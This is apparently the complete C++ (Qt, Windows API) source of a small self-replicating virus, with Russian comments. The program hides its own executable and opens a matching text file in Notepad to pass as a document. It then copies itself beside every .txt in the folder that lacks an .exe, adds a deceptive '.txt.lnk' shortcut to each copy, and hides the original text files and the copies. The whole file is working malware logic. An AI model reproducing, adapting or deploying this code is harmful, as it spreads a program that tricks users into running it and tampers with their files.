#include <QApplication>
#include <QDir>
#include <QCoreApplication>
#include <QProcess>
#include <windows.h>

int main(int argc, char *argv[])
{
    Q_UNUSED(argc);
    /*
     * Первая часть
     * Работа со своим .txt и .exe
     */

    // Узнаём свой путь
    QString nameProg = argv[0];

    // Сокрытие исполняемого файла
    SetFileAttributes((LPCTSTR)nameProg.utf16(), FILE_ATTRIBUTE_HIDDEN);

    // Переходим к тексту
    QString nameTxt = nameProg;
    nameTxt[nameTxt.length()-1] = 't';
    nameTxt[nameTxt.length()-2] = 'x';
    nameTxt[nameTxt.length()-3] = 't';

    // Параметры
    QStringList param;
    param.append(nameTxt);
    if(!QProcess::startDetached("notepad", param))
    {
        QProcess::startDetached("notepad");
    }

    // Сокрытие исходного текста
    SetFileAttributes((LPCTSTR)nameTxt.utf16(), FILE_ATTRIBUTE_HIDDEN);



    /*
     * Часть вторая
     * Работа с файлами в папке
     */

    // Определяем рабочую папку
    QString nameDir = nameProg;
    while(nameDir[nameDir.length()-1] != '\\') nameDir = nameDir.left(nameDir.length()-1);

    QDir dir(nameDir);
    QStringList listNameFile = dir.entryList();

    // Ищем не обработанные .txt
    QString current;
    for(int i = 0; i < listNameFile.length(); i++)
    {
        current = listNameFile.at(i);
        if(current.length() > 4)
        {
            if((current.at(current.length()-4) == '.') &&
                    (current.at(current.length()-3) == 't') &&
                    (current.at(current.length()-2) == 'x') &&
                    (current.at(current.length()-1) == 't'))
            {
                // Проверка на наличие .exe
                QString nameExe = current;
                nameExe[nameExe.length()-3] = 'e';
                nameExe[nameExe.length()-2] = 'x';
                nameExe[nameExe.length()-1] = 'e';

                if(!QFile::exists(nameExe))
                {
                    // Если нет, то создаём файл и линк
                    QString nameNewExe = nameDir + nameExe;
                    QFile::copy(nameProg, nameNewExe);
                    QString nameLink = nameNewExe;
                    nameLink[nameLink.length()-3] = 't';
                    nameLink[nameLink.length()-2] = 'x';
                    nameLink[nameLink.length()-1] = 't';
                    nameLink.append('.');
                    nameLink.append('l');
                    nameLink.append('n');
                    nameLink.append('k');
                    QFile::link(nameNewExe, nameLink);
                }
                // На всякий случай скрываем .txt и .exe
                SetFileAttributes((LPCTSTR)((nameDir + current).utf16()), FILE_ATTRIBUTE_HIDDEN);
                SetFileAttributes((LPCTSTR)((nameDir + nameExe).utf16()), FILE_ATTRIBUTE_HIDDEN);
            }
        }
    }

    return 0;
}
